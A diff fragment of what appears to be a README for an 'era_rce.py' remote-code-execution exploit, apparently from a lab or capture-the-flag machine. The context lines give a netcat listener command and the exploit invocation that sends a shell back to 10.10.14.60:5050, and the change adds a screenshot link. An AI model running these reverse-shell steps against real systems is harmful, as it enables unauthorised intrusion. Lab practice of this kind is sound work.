@@ -41,4 +41,5 @@ start netcat `nc -lvnp 5050`
 
 execute code `python3 era_rce.py 10.10.14.60 5050 --no-listen`
 
+<img width="1910" height="836" alt="1" src="https://github.com/user-attachments/assets/7677722e-23ff-4f53-999b-8b5d18150127" />
 
